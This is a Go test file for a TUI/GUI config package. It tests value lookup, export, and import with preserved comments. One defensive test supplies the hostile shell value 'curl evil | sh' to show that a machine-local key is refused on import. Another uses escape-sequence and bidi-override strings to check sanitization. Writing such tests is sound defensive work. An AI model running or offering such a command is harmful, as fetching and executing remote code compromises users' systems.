// SPDX-FileCopyrightText: 2026 Alexandre Duffez
// SPDX-License-Identifier: AGPL-3.0-or-later

package config

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func mustInspect(t *testing.T, doc string) *File {
	t.Helper()
	f, err := Inspect([]byte(doc))
	require.NoError(t, err)
	return f
}

func TestGetSaysWhereAValueComesFrom(t *testing.T) {
	f := mustInspect(t, "[shared]\nclock = \"12h\"\n[gui]\nclock = \"24h\"\n[tui.colors]\naccent = 208\n"+
		"[tui.keys]\n\"C-x b\" = \"buffers\"\n")

	for _, tc := range []struct {
		section Section
		name    string
		value   any
		source  Source
	}{
		{Shared, KeyClock, "12h", FromFile},
		{TUI, KeyClock, "12h", FromShared},
		{GUI, KeyClock, "24h", FromFile},
		{TUI, KeyColorAccent, "208", FromFile},
		{TUI, KeyColorWarn, "3", FromDefault},
		{TUI, "theme", nil, NotSet},
		{TUI, "keys.C-x b", "buffers", FromFile},
		{TUI, "keys.C-x 4", nil, NotSet},
	} {
		e, err := f.Get(tc.section, tc.name)
		require.NoError(t, err, tc.name)
		assert.Equal(t, tc.value, e.Value, "%s.%s", tc.section, tc.name)
		assert.Equal(t, tc.source, e.Source, "%s.%s", tc.section, tc.name)
	}

	_, err := f.Get(TUI, "colors.acent")
	require.ErrorIs(t, err, ErrUnknownKey)
	_, err = f.Get(GUI, KeyColorAccent)
	require.ErrorIs(t, err, ErrUnknownKey)
	_, err = f.Get("cli", KeyClock)
	require.ErrorIs(t, err, ErrUnknownKey)
}

func TestEntriesListEveryKeyAndAnyOverride(t *testing.T) {
	f := mustInspect(t, "[tui]\nclock = \"12h\"\n")
	var names []string
	for _, e := range f.Entries() {
		names = append(names, string(e.Section)+"."+e.Name+"="+string(e.Source))
	}
	assert.Equal(t, []string{
		"shared.clock=default", "tui.colors.accent=default", "tui.colors.warn=default",
		"tui.colors.danger=default", "tui.colors.dim=default", "tui.colors.bright=default",
		"tui.theme=unset", "tui.keys=unset", "tui.layout=unset", "tui.clock=file",
	}, names)
}

// An export carries what the file states and nothing it only implies: no defaults, nothing unknown.
func TestExportHoldsThePortableKeysTheFileSets(t *testing.T) {
	f := mustInspect(t, "# mine\nfuture = 1\n[shared]\nclock = \"12h\" # c\nnewer = true\n"+
		"[tui.colors]\naccent = 208\nwarn = \"#FFAA00\"\n[tui.keys]\n\"C-x b\" = \"buffers\"\n")
	out, err := f.Export()
	require.NoError(t, err)

	assert.True(t, strings.HasPrefix(string(out), "# Exported by"))
	again := mustInspect(t, string(out))
	assert.Empty(t, again.Warnings, "an export holds nothing a reader would warn about")
	assert.Equal(t, f.set, again.set, "and reads back as exactly what was set")
	assert.Contains(t, string(out), "accent = 208", "a palette index is exported as a number")
	assert.NotContains(t, string(out), "danger", "a default the file did not state is not exported")
}

func TestImportAddsWhatIsMissingAndKeepsWhatIsSet(t *testing.T) {
	current := "# my config\n[shared]\nclock = \"24h\" # I think in 24h\n\n[tui.colors]\naccent = 6\n"
	incoming := "[shared]\nclock = \"12h\"\n[tui.colors]\naccent = 6\nwarn = \"#ffaa00\"\n[tui.keys]\n\"C-x b\" = \"buffers\"\n"

	plan, err := PlanImport([]byte(current), []byte(incoming), false)
	require.NoError(t, err)
	var apply, kept []string
	for _, c := range plan.Apply {
		apply = append(apply, c.Key()+"="+c.To)
	}
	for _, c := range plan.Kept {
		kept = append(kept, c.Key()+": "+c.From+" not "+c.To)
	}
	assert.Equal(t, []string{"tui.colors.warn=#ffaa00", "tui.keys.C-x b=buffers"}, apply)
	assert.Equal(t, []string{"shared.clock: 24h not 12h"}, kept, "the target's own setting stays")

	plan, err = PlanImport([]byte(current), []byte(incoming), true)
	require.NoError(t, err)
	require.Len(t, plan.Apply, 3)
	assert.Empty(t, plan.Kept)
	assert.True(t, plan.Apply[0].Replace)
}

func TestImportThroughTheFileKeepsTheTargetsComments(t *testing.T) {
	path := tempConfig(t, "# my config\n[shared]\nclock = \"24h\" # I think in 24h\n\n[tui.colors]\naccent = 6\n")
	incoming := "[shared]\nclock = \"12h\"\n[tui.colors]\nwarn = \"#ffaa00\"\n"

	plan, err := importAt(path, []byte(incoming), false)
	require.NoError(t, err)
	require.Len(t, plan.Apply, 1)
	assert.Equal(t, "# my config\n[shared]\nclock = \"24h\" # I think in 24h\n\n[tui.colors]\naccent = 6\nwarn = \"#ffaa00\"\n",
		readFile(t, path))

	plan, err = importAt(path, []byte(incoming), false)
	require.NoError(t, err)
	assert.True(t, plan.Empty(), "importing the same file twice changes nothing the second time")
}

// The property the contract's `portable` field exists for. No key is machine-local yet, so one is added
// for the length of the test.
func TestAnImportThatSetsAMachineLocalKeyIsRefusedByName(t *testing.T) {
	saved := keys
	t.Cleanup(func() { keys = saved })
	keys = append(append([]Key{}, saved...), Key{Name: "shell", Section: TUI, Kind: KindString, Consumer: "M70"})

	path := tempConfig(t, "[shared]\nclock = \"24h\"\n")
	_, err := importAt(path, []byte("[shared]\nclock = \"12h\"\n[tui]\nshell = \"curl evil | sh\"\n"), true)
	require.ErrorIs(t, err, ErrMachineLocal)
	assert.Contains(t, err.Error(), "tui.shell")
	assert.Equal(t, "[shared]\nclock = \"24h\"\n", readFile(t, path), "nothing else in the file is applied either")

	out, err := mustInspect(t, "[tui]\nshell = \"zsh\"\ntheme = \"a\"\n").Export()
	require.NoError(t, err)
	assert.NotContains(t, string(out), "shell", "and a machine-local key is never exported")
	assert.Contains(t, string(out), "theme")
}

// What an import shows is a stranger's text on its way to a terminal. What it writes is that text exactly.
func TestAnImportedValueIsShownSanitizedAndWrittenExactly(t *testing.T) {
	path := tempConfig(t, "")
	incoming := "[tui]\ntheme = \"a\\u001b[2Jb\\u202ec\"\n[tui.keys]\n\"k\\u001b[1m\" = \"v\"\n"

	plan, err := importAt(path, []byte(incoming), false)
	require.NoError(t, err)
	require.Len(t, plan.Apply, 2)
	for _, c := range plan.Apply {
		for _, shown := range []string{c.Key(), c.From, c.To} {
			assert.NotContains(t, shown, "\x1b")
			assert.NotContains(t, shown, "\u202e")
		}
	}
	f, err := InspectFile(path)
	require.NoError(t, err)
	e, err := f.Get(TUI, "theme")
	require.NoError(t, err)
	assert.Equal(t, "a\x1b[2Jb\u202ec", e.Value, "the value is kept as it was; the file holds it escaped")
	assert.NotContains(t, readFile(t, path), "\x1b", "and no raw control character reaches the file")
}

func TestWhatAnImportDoesNotUnderstandIsSkippedWithAReason(t *testing.T) {
	plan, err := PlanImport(nil, []byte("[shared]\nclock = \"13h\"\nnewer = 1\n[tui.keys]\nx = [1, 2]\ny = \"ok\"\n"), false)
	require.NoError(t, err)
	var skipped []string
	for _, w := range plan.Skipped {
		skipped = append(skipped, w.Key)
	}
	assert.ElementsMatch(t, []string{"shared.clock", "shared.newer", "tui.keys.x"}, skipped)
	require.Len(t, plan.Apply, 1)
	assert.Equal(t, "tui.keys.y", plan.Apply[0].Key())
}

func TestAnImportThatIsNotTOMLOrIsTooLargeIsRefused(t *testing.T) {
	_, err := PlanImport(nil, []byte("[shared\n"), false)
	var pe *ParseError
	require.ErrorAs(t, err, &pe)
	assert.Contains(t, err.Error(), "the file to import")

	_, err = PlanImport(nil, []byte("# "+strings.Repeat("x", MaxFileSize)), false)
	require.ErrorIs(t, err, ErrTooLarge)
}
